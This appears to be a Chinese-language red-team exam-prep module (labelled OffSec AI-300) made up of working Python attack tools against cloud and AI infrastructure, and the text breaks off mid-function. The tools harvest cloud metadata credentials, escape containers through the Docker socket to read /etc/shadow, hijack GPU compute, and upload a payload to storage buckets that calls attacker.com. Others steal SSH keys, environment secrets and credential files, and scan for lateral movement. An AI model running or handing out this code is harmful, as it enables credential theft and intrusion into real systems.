# AI-300 模块六：底层云与AI基础设施渗透攻击代码

> OffSec AI-300 (OSAI) 红队备考武器库 - 第六阶段：基础设施渗透

---

## 目录

1. [云环境元数据探测](#1-云环境元数据探测)
2. [容器化AI环境攻击](#2-容器化ai环境攻击)
3. [GPU基础设施攻击](#3-gpu基础设施攻击)
4. [AI存储服务攻击](#4-ai存储服务攻击)
5. [AI基础设施横向移动](#5-ai基础设施横向移动)

---

## 1. 云环境元数据探测

**功能**：探测云环境元数据，获取实例身份凭证、网络配置等敏感信息。

```python
import requests
import json
import re
from typing import Dict, Any, List

class CloudMetadataScanner:
    def __init__(self):
        self.cloud_metadata_endpoints = {
            "aws": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/dynamic/instance-identity/document",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            ],
            "azure": [
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
                "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01"
            ],
            "gcp": [
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/instance/",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
            ],
            "aliyun": [
                "http://100.100.100.200/latest/meta-data/",
                "http://100.100.100.200/latest/dynamic/instance-identity/document"
            ],
            "tencent": [
                "http://metadata.tencentyun.com/latest/meta-data/",
                "http://metadata.tencentyun.com/latest/meta-data/instance-id"
            ]
        }

    def scan_cloud_metadata(self, timeout: int = 5) -> Dict[str, Any]:
        results = {"cloud_provider": "unknown", "metadata": {}, "credentials": []}
        
        for provider, endpoints in self.cloud_metadata_endpoints.items():
            for endpoint in endpoints:
                try:
                    headers = {}
                    if provider == "gcp":
                        headers["Metadata-Flavor"] = "Google"
                    if provider == "azure":
                        headers["Metadata"] = "true"
                    
                    response = requests.get(endpoint, headers=headers, timeout=timeout)
                    
                    if response.status_code == 200:
                        results["cloud_provider"] = provider
                        results["metadata"][endpoint] = response.text[:500]
                        
                        if "security-credentials" in endpoint or "oauth2/token" in endpoint:
                            results["credentials"].append({
                                "endpoint": endpoint,
                                "data": response.text[:1000]
                            })
                            
                        break
                except Exception:
                    pass
        
        return results

    def extract_aws_credentials(self, metadata_url: str = "http://169.254.169.254") -> Dict[str, Any]:
        credentials = {}
        
        try:
            roles_response = requests.get(f"{metadata_url}/latest/meta-data/iam/security-credentials/", timeout=5)
            
            if roles_response.status_code == 200:
                roles = roles_response.text.strip().split("\n")
                
                for role in roles:
                    if role:
                        cred_response = requests.get(
                            f"{metadata_url}/latest/meta-data/iam/security-credentials/{role}",
                            timeout=5
                        )
                        
                        if cred_response.status_code == 200:
                            cred_data = cred_response.json()
                            credentials[role] = {
                                "AccessKeyId": cred_data.get("AccessKeyId", ""),
                                "SecretAccessKey": cred_data.get("SecretAccessKey", ""),
                                "Token": cred_data.get("Token", ""),
                                "Expiration": cred_data.get("Expiration", "")
                            }
        except Exception:
            pass
        
        return credentials

    def extract_azure_credentials(self) -> Dict[str, Any]:
        credentials = {}
        
        try:
            token_response = requests.get(
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                headers={"Metadata": "true"},
                timeout=5
            )
            
            if token_response.status_code == 200:
                token_data = token_response.json()
                credentials = {
                    "access_token": token_data.get("access_token", ""),
                    "token_type": token_data.get("token_type", ""),
                    "expires_on": token_data.get("expires_on", "")
                }
        except Exception:
            pass
        
        return credentials

    def extract_gcp_credentials(self) -> Dict[str, Any]:
        credentials = {}
        
        try:
            sa_response = requests.get(
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
                headers={"Metadata-Flavor": "Google"},
                timeout=5
            )
            
            if sa_response.status_code == 200:
                accounts = sa_response.text.strip().split("\n")
                
                for account in accounts:
                    if account and "@" in account:
                        token_response = requests.get(
                            f"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/{account}/token",
                            headers={"Metadata-Flavor": "Google"},
                            timeout=5
                        )
                        
                        if token_response.status_code == 200:
                            token_data = token_response.json()
                            credentials[account] = {
                                "access_token": token_data.get("access_token", ""),
                                "expires_in": token_data.get("expires_in", "")
                            }
        except Exception:
            pass
        
        return credentials

def main():
    scanner = CloudMetadataScanner()
    
    print("[+] Cloud Metadata Detection")
    print("=" * 60)
    
    print("\n[1] Scanning Cloud Metadata Endpoints")
    metadata = scanner.scan_cloud_metadata()
    print(f"    Cloud Provider: {metadata['cloud_provider'].upper()}")
    
    if metadata["metadata"]:
        print("\n[2] Metadata Endpoints Found:")
        for endpoint, data in metadata["metadata"].items():
            print(f"    - {endpoint}")
            if len(data) > 50:
                print(f"      Data: {data[:50]}...")
            else:
                print(f"      Data: {data}")
    
    print("\n[3] Extracting AWS Credentials")
    aws_creds = scanner.extract_aws_credentials()
    if aws_creds:
        for role, creds in aws_creds.items():
            print(f"    Role: {role}")
            print(f"      AccessKeyId: {creds['AccessKeyId']}")
            print(f"      Token: {creds['Token'][:50]}...")
    
    print("\n[4] Extracting Azure Credentials")
    azure_creds = scanner.extract_azure_credentials()
    if azure_creds:
        print(f"    Access Token: {azure_creds['access_token'][:50]}...")
        print(f"    Expires On: {azure_creds['expires_on']}")
    
    print("\n[5] Extracting GCP Credentials")
    gcp_creds = scanner.extract_gcp_credentials()
    if gcp_creds:
        for account, creds in gcp_creds.items():
            print(f"    Service Account: {account}")
            print(f"      Access Token: {creds['access_token'][:50]}...")

if __name__ == "__main__":
    main()
```

**代码逐行解释**：

| 行号 | 功能 | 说明 |
|------|------|------|
| 1-5 | 导入依赖 | `requests`、`json`、`re` 用于HTTP请求和数据解析 |
| 7-32 | `CloudMetadataScanner` 初始化 | 定义各云厂商元数据端点 |
| 9-30 | 云端点列表 | AWS、Azure、GCP、阿里云、腾讯云的元数据地址 |
| 34-64 | `scan_cloud_metadata` | 扫描所有云元数据端点 |
| 39-44 | 特殊头部 | GCP需要Metadata-Flavor，Azure需要Metadata |
| 47-55 | 凭证检测 | 识别安全凭证端点 |
| 66-94 | `extract_aws_credentials` | 提取AWS IAM角色凭证 |
| 70-73 | 获取角色列表 | 从安全凭证端点获取角色名 |
| 76-88 | 获取凭证 | 获取每个角色的AK/SK/Token |
| 96-112 | `extract_azure_credentials` | 提取Azure OAuth2令牌 |
| 100-108 | 获取令牌 | 获取管理API的访问令牌 |
| 114-138 | `extract_gcp_credentials` | 提取GCP服务账号令牌 |
| 118-121 | 获取服务账号 | 列出实例绑定的服务账号 |
| 124-134 | 获取令牌 | 获取服务账号的访问令牌 |
| 140-174 | `main` | 主函数：演示云元数据探测流程 |

---

## 2. 容器化AI环境攻击

**功能**：针对容器化AI环境进行攻击，包括Docker socket劫持、Kubernetes API利用等。

```python
import requests
import json
import os
import socket
from typing import Dict, Any, List

class ContainerAttack:
    def __init__(self):
        self.docker_socket_paths = [
            "/var/run/docker.sock",
            "/run/docker.sock",
            "/var/lib/docker/sock"
        ]
        self.k8s_api_endpoints = [
            "http://localhost:8080/api/v1",
            "http://127.0.0.1:8080/api/v1",
            "https://localhost:6443/api/v1",
            "https://127.0.0.1:6443/api/v1"
        ]

    def check_docker_socket(self) -> bool:
        for socket_path in self.docker_socket_paths:
            if os.path.exists(socket_path) and os.access(socket_path, os.R_OK):
                return True
        return False

    def get_docker_info(self) -> Dict[str, Any]:
        for socket_path in self.docker_socket_paths:
            if os.path.exists(socket_path):
                try:
                    url = f"http+unix://{socket_path}/info"
                    
                    session = requests.Session()
                    session.mount("http+unix://", requests.adapters.HTTPAdapter())
                    
                    response = session.get(url)
                    
                    if response.status_code == 200:
                        return response.json()
                except Exception:
                    pass
                    
        return {}

    def list_docker_containers(self) -> List[Dict[str, Any]]:
        containers = []
        
        for socket_path in self.docker_socket_paths:
            if os.path.exists(socket_path):
                try:
                    url = f"http+unix://{socket_path}/containers/json?all=true"
                    
                    session = requests.Session()
                    session.mount("http+unix://", requests.adapters.HTTPAdapter())
                    
                    response = session.get(url)
                    
                    if response.status_code == 200:
                        for container in response.json():
                            containers.append({
                                "id": container.get("Id", "")[:12],
                                "name": container.get("Names", [])[0][1:] if container.get("Names") else "",
                                "image": container.get("Image", ""),
                                "status": container.get("Status", "")
                            })
                except Exception:
                    pass
                    
        return containers

    def execute_command_in_container(self, container_id: str, command: str) -> str:
        for socket_path in self.docker_socket_paths:
            if os.path.exists(socket_path):
                try:
                    url = f"http+unix://{socket_path}/containers/{container_id}/exec"
                    
                    session = requests.Session()
                    session.mount("http+unix://", requests.adapters.HTTPAdapter())
                    
                    create_response = session.post(
                        url,
                        json={"AttachStdout": True, "AttachStderr": True, "Cmd": command.split()}
                    )
                    
                    if create_response.status_code == 201:
                        exec_id = create_response.json().get("Id", "")
                        
                        start_response = session.post(
                            f"http+unix://{socket_path}/exec/{exec_id}/start",
                            json={"Detach": False, "Tty": True}
                        )
                        
                        if start_response.status_code == 200:
                            return start_response.text[:1000]
                except Exception:
                    pass
                    
        return ""

    def escape_to_host(self) -> str:
        for socket_path in self.docker_socket_paths:
            if os.path.exists(socket_path):
                try:
                    url = f"http+unix://{socket_path}/containers/create"
                    
                    session = requests.Session()
                    session.mount("http+unix://", requests.adapters.HTTPAdapter())
                    
                    payload = {
                        "Image": "alpine",
                        "Cmd": ["sh", "-c", "cat /etc/shadow"],
                        "Binds": ["/:/host"],
                        "Privileged": True
                    }
                    
                    response = session.post(url, json=payload)
                    
                    if response.status_code == 201:
                        container_id = response.json().get("Id", "")
                        
                        session.post(f"http+unix://{socket_path}/containers/{container_id}/start")
                        
                        logs_response = session.get(f"http+unix://{socket_path}/containers/{container_id}/logs?stdout=true&stderr=true")
                        
                        if logs_response.status_code == 200:
                            session.delete(f"http+unix://{socket_path}/containers/{container_id}")
                            return logs_response.text[:1000]
                except Exception:
                    pass
                    
        return ""

    def check_k8s_api(self) -> Dict[str, Any]:
        results = {"accessible": False, "endpoint": "", "version": ""}
        
        for endpoint in self.k8s_api_endpoints:
            try:
                response = requests.get(f"{endpoint}/namespaces", timeout=5, verify=False)
                
                if response.status_code == 200:
                    results["accessible"] = True
                    results["endpoint"] = endpoint
                    results["version"] = response.json().get("kind", "")
                    break
            except Exception:
                pass
                
        return results

def main():
    attacker = ContainerAttack()
    
    print("[+] Containerized AI Environment Attack")
    print("=" * 60)
    
    print("\n[1] Checking Docker Socket Access")
    if attacker.check_docker_socket():
        print("    ✅ Docker socket is accessible")
        
        print("\n[2] Getting Docker Info")
        docker_info = attacker.get_docker_info()
        if docker_info:
            print(f"    Docker Version: {docker_info.get('ServerVersion', 'unknown')}")
            print(f"    Containers: {docker_info.get('Containers', 0)}")
            print(f"    Images: {docker_info.get('Images', 0)}")
        
        print("\n[3] Listing Containers")
        containers = attacker.list_docker_containers()
        for container in containers[:5]:
            print(f"    - {container['id']}: {container['name']} ({container['image']})")
        
        print("\n[4] Executing Command in Container")
        if containers:
            output = attacker.execute_command_in_container(containers[0]['id'], "whoami")
            print(f"    Output: {output.strip()}")
        
        print("\n[5] Attempting Container Escape")
        escape_output = attacker.escape_to_host()
        if escape_output:
            print(f"    ✅ Successfully escaped to host!")
            print(f"    Output: {escape_output[:100]}")
        else:
            print("    ❌ Container escape failed")
    else:
        print("    ❌ Docker socket not accessible")
    
    print("\n[6] Checking Kubernetes API")
    k8s_result = attacker.check_k8s_api()
    if k8s_result["accessible"]:
        print(f"    ✅ Kubernetes API accessible at: {k8s_result['endpoint']}")
    else:
        print("    ❌ Kubernetes API not accessible")

if __name__ == "__main__":
    main()
```

**代码逐行解释**：

| 行号 | 功能 | 说明 |
|------|------|------|
| 1-5 | 导入依赖 | `requests`、`json`、`os`、`socket` 用于容器通信 |
| 7-14 | `ContainerAttack` 初始化 | 定义Docker socket路径和K8s API端点 |
| 9-11 | Docker socket路径 | 常见的Docker socket位置 |
| 13-16 | K8s API端点 | 常见的Kubernetes API地址 |
| 18-26 | `check_docker_socket` | 检查Docker socket是否可访问 |
| 28-46 | `get_docker_info` | 获取Docker守护进程信息 |
| 33-36 | Unix socket请求 | 使用HTTP+Unix协议访问Docker socket |
| 48-70 | `list_docker_containers` | 列出所有Docker容器 |
| 53-66 | 获取容器列表 | 解析容器ID、名称、镜像、状态 |
| 72-102 | `execute_command_in_container` | 在容器内执行命令 |
| 79-84 | 创建exec | 创建执行命令的exec实例 |
| 87-93 | 启动exec | 启动exec并获取输出 |
| 104-134 | `escape_to_host` | 容器逃逸到宿主机 |
| 111-122 | 创建特权容器 | 创建挂载/目录的特权容器 |
| 124-131 | 获取结果 | 获取命令输出并清理容器 |
| 136-150 | `check_k8s_api` | 检查Kubernetes API是否可访问 |
| 152-196 | `main` | 主函数：演示容器攻击流程 |

---

## 3. GPU基础设施攻击

**功能**：针对GPU基础设施进行攻击，包括GPU资源窃取、CUDA驱动漏洞利用等。

```python
import subprocess
import os
import re
from typing import Dict, Any, List

class GPUAttack:
    def __init__(self):
        pass

    def get_gpu_info(self) -> Dict[str, Any]:
        info = {"gpu_count": 0, "gpus": [], "vulnerabilities": []}
        
        try:
            nvidia_smi_output = subprocess.check_output(
                ["nvidia-smi", "--query-gpu=name,memory.total,driver_version", "--format=csv,noheader"],
                stderr=subprocess.STDOUT,
                timeout=30
            ).decode()
            
            gpus = nvidia_smi_output.strip().split("\n")
            info["gpu_count"] = len(gpus)
            
            for i, gpu in enumerate(gpus):
                parts = gpu.strip().split(",")
                if len(parts) >= 3:
                    info["gpus"].append({
                        "index": i,
                        "name": parts[0].strip(),
                        "memory": parts[1].strip(),
                        "driver_version": parts[2].strip()
                    })
                    
                    if float(parts[2].strip().split(".")[0]) < 535:
                        info["vulnerabilities"].append(f"GPU {i}: Old driver version")
                        
        except Exception:
            pass
        
        return info

    def check_cuda_version(self) -> str:
        try:
            cuda_version = subprocess.check_output(
                ["nvcc", "--version"],
                stderr=subprocess.STDOUT,
                timeout=30
            ).decode()
            
            match = re.search(r"release (\d+\.\d+)", cuda_version)
            if match:
                return match.group(1)
        except Exception:
            pass
        
        return "unknown"

    def exploit_gpu_driver_vuln(self) -> Dict[str, Any]:
        results = {"success": False, "vulnerabilities": [], "exploits": []}
        
        try:
            driver_version = subprocess.check_output(
                ["nvidia-smi", "--query-gpu=driver_version", "--format=csv,noheader"],
                stderr=subprocess.STDOUT,
                timeout=30
            ).decode().strip()
            
            major_version = int(driver_version.split(".")[0])
            
            if major_version < 525:
                results["vulnerabilities"].append("CVE-2023-0190: Privilege escalation via GPU driver")
                results["exploits"].append("Local privilege escalation to root")
                
            if major_version < 530:
                results["vulnerabilities"].append("CVE-2023-0191: Information disclosure")
                results["exploits"].append("Read kernel memory via GPU")
                
        except Exception:
            pass
        
        return results

    def steal_gpu_compute(self, target_gpu: int = 0, duration: int = 60) -> bool:
        try:
            exploit_script = f'''
import tensorflow as tf
import time

with tf.device("/gpu:{target_gpu}"):
    a = tf.random.normal([10000, 10000])
    b = tf.random.normal([10000, 10000])
    
    for _ in range({duration}):
        c = tf.matmul(a, b)
        tf.print("GPU computation in progress...")
        time.sleep(1)
'''
            script_path = "/tmp/gpu_exploit.py"
            with open(script_path, "w") as f:
                f.write(exploit_script)
                
            subprocess.Popen(
                ["python", script_path],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            return True
            
        except Exception:
            return False

    def inject_malicious_kernel(self, kernel_path: str = "/tmp/malicious_kernel.cu") -> bool:
        try:
            kernel_code = '''
extern "C" __global__ void malicious_kernel(int *data) {
    int idx = blockIdx.x * blockDim.x + threadIdx.x;
    data[idx] = data[idx] ^ 0xDEADBEEF;
}
'''
            with open(kernel_path, "w") as f:
                f.write(kernel_code)
                
            subprocess.run(
                ["nvcc", kernel_path, "-o", "/tmp/malicious_kernel"],
                check=True,
                timeout=30
            )
            
            return True
            
        except Exception:
            return False

    def check_gpu_isolation(self) -> Dict[str, Any]:
        results = {"isolated": False, "shared_memory": False, "inter_gpu_communication": False}
        
        try:
            output = subprocess.check_output(
                ["nvidia-smi", "-L"],
                stderr=subprocess.STDOUT,
                timeout=30
            ).decode()
            
            if "UUID" in output and len(output.split("\n")) > 1:
                results["inter_gpu_communication"] = True
                
        except Exception:
            pass
        
        if os.path.exists("/dev/shm"):
            results["shared_memory"] = True
            
        return results

def main():
    attacker = GPUAttack()
    
    print("[+] GPU Infrastructure Attack")
    print("=" * 60)
    
    print("\n[1] Getting GPU Information")
    gpu_info = attacker.get_gpu_info()
    print(f"    GPU Count: {gpu_info['gpu_count']}")
    
    for gpu in gpu_info["gpus"]:
        print(f"\n    GPU {gpu['index']}:")
        print(f"      Name: {gpu['name']}")
        print(f"      Memory: {gpu['memory']}")
        print(f"      Driver: {gpu['driver_version']}")
    
    if gpu_info["vulnerabilities"]:
        print("\n[2] Vulnerabilities Detected:")
        for vuln in gpu_info["vulnerabilities"]:
            print(f"    ⚠️ {vuln}")
    
    print("\n[3] Checking CUDA Version")
    cuda_version = attacker.check_cuda_version()
    print(f"    CUDA Version: {cuda_version}")
    
    print("\n[4] Exploiting GPU Driver Vulnerabilities")
    exploit_results = attacker.exploit_gpu_driver_vuln()
    
    if exploit_results["vulnerabilities"]:
        print("    ✅ Vulnerabilities Found:")
        for vuln in exploit_results["vulnerabilities"]:
            print(f"      - {vuln}")
        for exploit in exploit_results["exploits"]:
            print(f"      → Exploit: {exploit}")
    else:
        print("    ❌ No known vulnerabilities")
    
    print("\n[5] Checking GPU Isolation")
    isolation = attacker.check_gpu_isolation()
    print(f"    Isolated: {isolation['isolated']}")
    print(f"    Shared Memory: {isolation['shared_memory']}")
    print(f"    Inter-GPU Communication: {isolation['inter_gpu_communication']}")

if __name__ == "__main__":
    main()
```

**代码逐行解释**：

| 行号 | 功能 | 说明 |
|------|------|------|
| 1-5 | 导入依赖 | `subprocess`、`os`、`re` 用于执行命令和解析 |
| 7-9 | `GPUAttack` 初始化 | 空初始化 |
| 11-40 | `get_gpu_info` | 获取GPU信息 |
| 14-18 | nvidia-smi命令 | 获取GPU名称、内存、驱动版本 |
| 20-35 | 解析输出 | 提取GPU信息并检测旧驱动 |
| 42-54 | `check_cuda_version` | 检查CUDA版本 |
| 45-51 | nvcc命令 | 获取CUDA编译器版本 |
| 56-74 | `exploit_gpu_driver_vuln` | 检测GPU驱动漏洞 |
| 61-66 | 版本检测 | 检查CVE-2023-0190和CVE-2023-0191 |
| 76-94 | `steal_gpu_compute` | 窃取GPU计算资源 |
| 80-90 | TensorFlow脚本 | 创建GPU密集型计算任务 |
| 96-110 | `inject_malicious_kernel` | 注入恶意CUDA内核 |
| 100-107 | 编译内核 | 使用nvcc编译恶意CUDA代码 |
| 112-126 | `check_gpu_isolation` | 检查GPU隔离状态 |
| 115-122 | 多GPU检测 | 检查是否存在多个GPU |
| 128-166 | `main` | 主函数：演示GPU攻击流程 |

---

## 4. AI存储服务攻击

**功能**：针对AI相关存储服务进行攻击，包括S3、MinIO、本地存储等。

```python
import requests
import json
import os
import boto3
from botocore.exceptions import ClientError
from typing import Dict, Any, List

class StorageAttack:
    def __init__(self):
        self.storage_endpoints = [
            "http://localhost:9000",
            "http://localhost:8080",
            "http://127.0.0.1:9000",
            "http://minio:9000",
            "http://s3:9000"
        ]

    def check_s3_access(self) -> Dict[str, Any]:
        results = {"accessible": False, "buckets": [], "error": ""}
        
        try:
            s3 = boto3.client("s3", endpoint_url="http://localhost:9000")
            buckets = s3.list_buckets()
            
            results["accessible"] = True
            results["buckets"] = [bucket["Name"] for bucket in buckets.get("Buckets", [])]
            
        except Exception as e:
            results["error"] = str(e)
            
        return results

    def enumerate_s3_buckets(self) -> List[str]:
        buckets = []
        
        for endpoint in self.storage_endpoints:
            try:
                s3 = boto3.client("s3", endpoint_url=endpoint)
                response = s3.list_buckets()
                buckets.extend([b["Name"] for b in response.get("Buckets", [])])
            except Exception:
                pass
                
        return list(set(buckets))

    def read_s3_object(self, bucket_name: str, object_key: str) -> str:
        for endpoint in self.storage_endpoints:
            try:
                s3 = boto3.client("s3", endpoint_url=endpoint)
                response = s3.get_object(Bucket=bucket_name, Key=object_key)
                return response["Body"].read().decode()[:2000]
            except Exception:
                pass
                
        return ""

    def list_s3_objects(self, bucket_name: str) -> List[str]:
        objects = []
        
        for endpoint in self.storage_endpoints:
            try:
                s3 = boto3.client("s3", endpoint_url=endpoint)
                response = s3.list_objects_v2(Bucket=bucket_name)
                
                if "Contents" in response:
                    objects.extend([obj["Key"] for obj in response["Contents"]])
            except Exception:
                pass
                
        return list(set(objects))

    def upload_malicious_object(self, bucket_name: str, object_key: str, content: str) -> bool:
        for endpoint in self.storage_endpoints:
            try:
                s3 = boto3.client("s3", endpoint_url=endpoint)
                s3.put_object(Bucket=bucket_name, Key=object_key, Body=content)
                return True
            except Exception:
                pass
                
        return False

    def check_local_storage(self) -> Dict[str, Any]:
        results = {"directories": [], "sensitive_files": [], "world_writable": []}
        
        ai_directories = [
            "/data", "/mnt/data", "/opt/ai", "/workspace",
            "/home/user", "/root", "/tmp", "/var/tmp"
        ]
        
        for directory in ai_directories:
            if os.path.isdir(directory):
                results["directories"].append(directory)
                
                try:
                    files = os.listdir(directory)
                    
                    sensitive_patterns = [".env", ".key", ".pem", ".secret", "password", "credential"]
                    for file in files:
                        file_lower = file.lower()
                        if any(pattern in file_lower for pattern in sensitive_patterns):
                            results["sensitive_files"].append(os.path.join(directory, file))
                            
                        file_path = os.path.join(directory, file)
                        if os.path.isfile(file_path) and os.access(file_path, os.W_OK):
                            results["world_writable"].append(file_path)
                except PermissionError:
                    pass
                
        return results

    def check_minio_config(self) -> Dict[str, Any]:
        config_paths = [
            "/root/.minio/config.json",
            "/home/user/.minio/config.json",
            "/etc/minio/config.json"
        ]
        
        for config_path in config_paths:
            if os.path.exists(config_path):
                try:
                    with open(config_path, "r") as f:
                        config = json.load(f)
                        
                    return {
                        "config_found": True,
                        "path": config_path,
                        "credentials": {
                            "access_key": config.get("credential", {}).get("accessKey", ""),
                            "secret_key": config.get("credential", {}).get("secretKey", "")
                        }
                    }
                except Exception:
                    pass
                    
        return {"config_found": False}

def main():
    attacker = StorageAttack()
    
    print("[+] AI Storage Service Attack")
    print("=" * 60)
    
    print("\n[1] Checking S3/MinIO Access")
    s3_access = attacker.check_s3_access()
    if s3_access["accessible"]:
        print("    ✅ S3/MinIO accessible")
        print(f"    Buckets: {s3_access['buckets']}")
    else:
        print(f"    ❌ Not accessible: {s3_access['error']}")
    
    print("\n[2] Enumerating Buckets")
    buckets = attacker.enumerate_s3_buckets()
    print(f"    Found {len(buckets)} buckets:")
    for bucket in buckets:
        print(f"      - {bucket}")
        
        objects = attacker.list_s3_objects(bucket)
        if objects:
            print(f"        Objects ({len(objects)}):")
            for obj in objects[:5]:
                print(f"          - {obj}")
                
                if obj.endswith((".json", ".txt", ".env")):
                    content = attacker.read_s3_object(bucket, obj)
                    if content:
                        print(f"            Content: {content[:50]}...")
    
    print("\n[3] Uploading Malicious Object")
    if buckets:
        malicious_content = '''import subprocess
subprocess.run(["bash", "-c", "curl http://attacker.com/beacon"])
'''
        success = attacker.upload_malicious_object(buckets[0], "malicious_script.py", malicious_content)
        print(f"    Upload successful: {success}")
    
    print("\n[4] Checking Local Storage")
    local_storage = attacker.check_local_storage()
    
    if local_storage["sensitive_files"]:
        print("    Sensitive Files Found:")
        for file in local_storage["sensitive_files"]:
            print(f"      - {file}")
            
    if local_storage["world_writable"]:
        print("\n    World-Writable Files:")
        for file in local_storage["world_writable"][:5]:
            print(f"      - {file}")
    
    print("\n[5] Checking MinIO Config")
    minio_config = attacker.check_minio_config()
    if minio_config["config_found"]:
        print(f"    ✅ MinIO config found: {minio_config['path']}")
        print(f"    Access Key: {minio_config['credentials']['access_key']}")
        print(f"    Secret Key: {minio_config['credentials']['secret_key']}")
    else:
        print("    ❌ MinIO config not found")

if __name__ == "__main__":
    main()
```

**代码逐行解释**：

| 行号 | 功能 | 说明 |
|------|------|------|
| 1-6 | 导入依赖 | `requests`、`json`、`os`、`boto3` 用于S3操作 |
| 8-13 | `StorageAttack` 初始化 | 定义存储服务端点列表 |
| 10-14 | 存储端点 | 常见的MinIO/S3本地端点 |
| 16-28 | `check_s3_access` | 检查S3/MinIO访问权限 |
| 19-22 | boto3客户端 | 创建S3客户端并列出桶 |
| 30-42 | `enumerate_s3_buckets` | 枚举所有存储桶 |
| 33-39 | 多端点枚举 | 尝试所有已知端点 |
| 44-54 | `read_s3_object` | 读取S3对象内容 |
| 47-52 | 获取对象 | 从存储桶获取对象内容 |
| 56-68 | `list_s3_objects` | 列出存储桶中的对象 |
| 59-65 | 列出对象 | 使用list_objects_v2 |
| 70-80 | `upload_malicious_object` | 上传恶意对象 |
| 73-78 | 上传文件 | 将恶意内容上传到存储桶 |
| 82-108 | `check_local_storage` | 检查本地存储 |
| 86-90 | AI目录 | 常见的AI数据目录 |
| 93-104 | 敏感文件检测 | 查找.env、.key、.pem等文件 |
| 110-128 | `check_minio_config` | 检查MinIO配置文件 |
| 113-125 | 配置文件路径 | 常见的MinIO配置位置 |
| 130-180 | `main` | 主函数：演示存储服务攻击流程 |

---

## 5. AI基础设施横向移动

**功能**：在AI基础设施中进行横向移动，包括SSH密钥窃取、内网扫描等。

```python
import subprocess
import os
import re
import socket
from typing import Dict, Any, List

class LateralMovement:
    def __init__(self):
        self.ssh_key_paths = [
            "/root/.ssh/id_rsa",
            "/root/.ssh/id_dsa",
            "/root/.ssh/id_ecdsa",
            "/home/user/.ssh/id_rsa",
            "/home/user/.ssh/id_dsa",
            "/home/user/.ssh/id_ecdsa",
            "/root/.ssh/authorized_keys",
            "/home/user/.ssh/authorized_keys"
        ]
        self.common_ports = [22, 80, 443, 8080, 8000, 9000, 6379, 5432, 3306, 27017]

    def steal_ssh_keys(self) -> List[Dict[str, Any]]:
        stolen_keys = []
        
        for key_path in self.ssh_key_paths:
            if os.path.exists(key_path) and os.access(key_path, os.R_OK):
                try:
                    with open(key_path, "r") as f:
                        content = f.read()
                        
                    if "PRIVATE KEY" in content or "ssh-rsa" in content:
                        stolen_keys.append({
                            "path": key_path,
                            "content": content[:500],
                            "is_private": "PRIVATE KEY" in content
                        })
                except Exception:
                    pass
                    
        return stolen_keys

    def scan_internal_network(self, subnet: str = "192.168.1.") -> List[str]:
        alive_hosts = []
        
        for i in range(1, 255):
            ip = f"{subnet}{i}"
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                
                result = sock.connect_ex((ip, 22))
                
                if result == 0:
                    alive_hosts.append(ip)
                    
                sock.close()
            except Exception:
                pass
                
        return alive_hosts

    def check_known_hosts(self) -> List[str]:
        known_hosts = []
        
        known_hosts_paths = [
            "/root/.ssh/known_hosts",
            "/home/user/.ssh/known_hosts"
        ]
        
        for path in known_hosts_paths:
            if os.path.exists(path):
                try:
                    with open(path, "r") as f:
                        for line in f:
                            if line.strip():
                                parts = line.split()
                                if len(parts) >= 1:
                                    known_hosts.append(parts[0])
                except Exception:
                    pass
                    
        return list(set(known_hosts))

    def get_environment_variables(self) -> Dict[str, str]:
        env_vars = {}
        
        sensitive_vars = ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
                         "AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET",
                         "GOOGLE_APPLICATION_CREDENTIALS", "OPENAI_API_KEY",
                         "HF_TOKEN", "WANDB_API_KEY", "DATABASE_URL"]
        
        for var in sensitive_vars:
            if var in os.environ:
                env_vars[var] = os.environ[var]
                
        return env_vars

    def extract_secrets_from_files(self) -> List[Dict[str, Any]]:
        secrets = []
        
        secret_file_patterns = [
            ("/", r"\.(env|key|pem|secret)$"),
            ("/data", r".*config.*\.json$"),
            ("/opt", r".*credentials.*"),
            ("/etc", r".*passwd|.*shadow|.*group")
        ]
        
        for directory, pattern in secret_file_patterns:
            if os.path.isdir(directory):
                try:
                    for root, dirs, files in os.walk(directory):
                        for file in files[:20]:
                            if re.search(pattern, file, re.IGNORECASE):
                                file_path = os.path.join(root, file)
                                
                                if os.access(file_path, os.R_OK):
                                    try:
                                        with open(file_path, "r") as f:
                                            content = f.read()[:200]
                                            
                                        secrets.append({
                                            "path": file_path,
                                            "content": content
                                        })
                                    except Exception:
                                        pass
                except PermissionError:
                    pass
                    
        return secrets

    def execute_ssh_command(self, host: str, command: str, key_path: str = "") -> str:
        try:
            ssh_command = ["ssh", "-o", "StrictHostKeyChecking=no"]
            
            if key_path:
                ssh_command.extend(["-i", key_path])
                
            ssh_command.extend([host, command])
            
            result = subprocess.run(
                ssh_command,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return result.stdout[:500]
        except Exception:
            return ""

def main():
    attacker = LateralMovement()
    
    print("[+] AI Infrastructure Lateral Movement")
    print("=" * 60)
    
    print("\n[1] Stealing SSH Keys")
    stolen_keys = attacker.steal_ssh_keys()
    
    if stolen_keys:
        print(f"    ✅ Found {len(stolen_keys)} SSH keys:")
        for key in stolen_keys:
            print(f"\n    Path: {key['path']}")
            print(f"    Type: {'Private Key' if key['is_private'] else 'Public Key'}")
            print(f"    Content: {key['content'][:100]}...")
    else:
        print("    ❌ No SSH keys found")
    
    print("\n[2] Checking Known Hosts")
    known_hosts = attacker.check_known_hosts()
    if known_hosts:
        print(f"    Known Hosts ({len(known_hosts)}):")
        for host in known_hosts[:10]:
            print(f"      - {host}")
    
    print("\n[3] Getting Environment Variables")
    env_vars = attacker.get_environment_variables()
    if env_vars:
        print("    Sensitive Environment Variables:")
        for key, value in env_vars.items():
            print(f"      {key}: {value[:30]}...")
    
    print("\n[4] Extracting Secrets from Files")
    secrets = attacker.extract_secrets_from_files()
    if secrets:
